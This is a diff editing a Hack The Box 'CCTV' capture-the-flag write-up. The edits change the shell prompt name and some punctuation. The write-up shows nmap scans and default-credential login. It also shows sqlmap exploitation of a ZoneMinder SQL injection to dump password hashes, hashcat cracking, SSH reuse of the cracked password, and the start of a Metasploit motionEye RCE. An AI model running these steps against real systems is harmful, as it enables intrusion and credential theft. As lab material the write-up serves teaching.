@@ -37,7 +37,7 @@ CCTV is a medium Linux machine from Hack The Box. The attack chain starts with a
 Starting with a fast port sweep, then a targeted service scan on the open ports:
 
 ```console
-oxdf@hacky$ nmap -p- --min-rate 10000 10.129.244.156
+kali@kali$ nmap -p- --min-rate 10000 10.129.244.156
 ...[snip]...
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -46,7 +46,7 @@ PORT   STATE SERVICE
 ```
 
 ```console
-oxdf@hacky$ nmap -sCV -p 22,80 10.129.244.156
+kali@kali$ nmap -sCV -p 22,80 10.129.244.156
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -73,15 +73,15 @@ Default credentials `admin:admin` work here. That's a quick win.
 
 ### ZoneMinder - TCP 80
 
-Once logged in, the ZoneMinder dashboard is mostly empty — no cameras configured. But the version number in the top-right corner is important: **1.37.63**.
+Once logged in, the ZoneMinder dashboard is mostly empty, no cameras configured. But the version number in the top-right corner is important: **1.37.63**.
 
 ![ZoneMinder dashboard showing version 1.37.63 in the top-right corner](/images/htb-cctv/zoneminder-dashboard-version.png)
 
-A quick search for ZoneMinder 1.37.63 vulnerabilities turns up CVE-2024-51482 — a SQL injection in the event tag removal endpoint. This is a well-documented vulnerability with a [security advisory from ZoneMinder](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3).
+A quick search for ZoneMinder 1.37.63 vulnerabilities turns up CVE-2024-51482, a SQL injection in the event tag removal endpoint. This is a well-documented vulnerability with a [security advisory from ZoneMinder](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3).
 
 ## Shell as mark
 
-### CVE-2024-51482 — ZoneMinder SQL Injection
+### CVE-2024-51482 - ZoneMinder SQL Injection
 
 CVE-2024-51482 is an authenticated SQL injection in ZoneMinder versions prior to 1.37.64. The vulnerable endpoint is `/zm/index.php?view=request&request=event&action=removetag`, where the `tid` parameter is passed directly into a SQL query without sanitization. Since I already have valid credentials (`admin:admin`), I can exploit this to dump the database.
 
@@ -98,7 +98,7 @@ http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
 I save the request to a file and feed it to sqlmap, targeting the Users table in the `zm` database:
 
 ```console
-oxdf@hacky$ sqlmap -r req.txt --batch --risk=3 --level=5 --time-sec=1 --threads=10 -D zm -T Users -C "Username,Password" --dump
+kali@kali$ sqlmap -r req.txt --batch --risk=3 --level=5 --time-sec=1 --threads=10 -D zm -T Users -C "Username,Password" --dump
 ...[snip]...
 +------------+--------------------------------------------------------------+
 | Username   | Password                                                     |
@@ -110,27 +110,27 @@ oxdf@hacky$ sqlmap -r req.txt --batch --risk=3 --level=5 --time-sec=1 --threads=
 ...[snip]...
 ```
 
-Three bcrypt hashes. The `$2y$10$` prefix tells me these are bcrypt with a cost factor of 10 — crackable, but not instant.
+Three bcrypt hashes. The `$2y$10$` prefix tells me these are bcrypt with a cost factor of 10, crackable, but not instant.
 
 ### Cracking the Hashes
 
 I throw them at hashcat with rockyou:
 
 ```console
-oxdf@hacky$ hashcat hashes.txt rockyou.txt --username -m 3200
+kali@kali$ hashcat hashes.txt rockyou.txt --username -m 3200
 ...[snip]...
 mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
 ...[snip]...
 ```
 
-Only mark's hash cracks: `opensesame`. The superadmin and admin hashes don't fall to rockyou. That's fine — one set of creds is all I need if they reuse passwords.
+Only mark's hash cracks: `opensesame`. The superadmin and admin hashes don't fall to rockyou. That's fine, one set of creds is all I need if they reuse passwords.
 
 ### SSH as mark
 
 Since `mark` looks like an OS-level account, I try the cracked password over SSH:
 
 ```console
-oxdf@hacky$ ssh mark@cctv.htb
+kali@kali$ ssh mark@cctv.htb
 mark@cctv.htb's password: opensesame
 ```
 
@@ -202,23 +202,19 @@ ssh> -L 8765:127.0.0.1:8765
 Forwarding port.
 ```
 
-Browsing to `http://127.0.0.1:8765/` reveals a motionEye instance — a web-based UI for managing security cameras. I log in with `admin:X1l9fx1ZjS7RZb` (reusing sa\_mark's password).
+Browsing to `http://127.0.0.1:8765/` reveals a motionEye instance, a web-based UI for managing security cameras. I log in with `admin:X1l9fx1ZjS7RZb` (reusing sa\_mark's password).
 
 The preferences panel shows **motionEye version 0.43.1b4**, running on Motion 4.7 and Ubuntu 24.04:
 
 ![motionEye preferences showing version 0.43.1b4 on Ubuntu 24.04](/images/htb-cctv/motioneye-version.png)
 
-### CVE-2025-60787 — motionEye Authenticated RCE
+### Exploitation via Metasploit
 
-This version of motionEye is vulnerable to CVE-2025-60787, an authenticated remote code execution vulnerability. The exploit is available on [Exploit-DB](https://www.exploit-db.com/exploits/52481). The vulnerability allows an authenticated user to inject OS commands through the camera configuration, specifically via parameters like the still image filename that get passed to a shell without sanitization.
-
-The "Still Images" configuration panel shows where the injection point lives — the Image File Name field accepts arbitrary input that gets executed:
+Searching for exploits against this version, I find CVE-2025-60787 on [Exploit-DB](https://www.exploit-db.com/exploits/52481). The vulnerability is in the camera configuration where input like the still image filename gets passed to a shell without sanitization.
 
 ![motionEye Still Images configuration showing the command injection field](/images/htb-cctv/motioneye-rce-payload.png)
 
-### Exploitation via Metasploit
-
-There's a Metasploit module for this, which handles the injection cleanly:
+There's a Metasploit module that handles the injection cleanly:
 
 ```console
 msf6 > use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
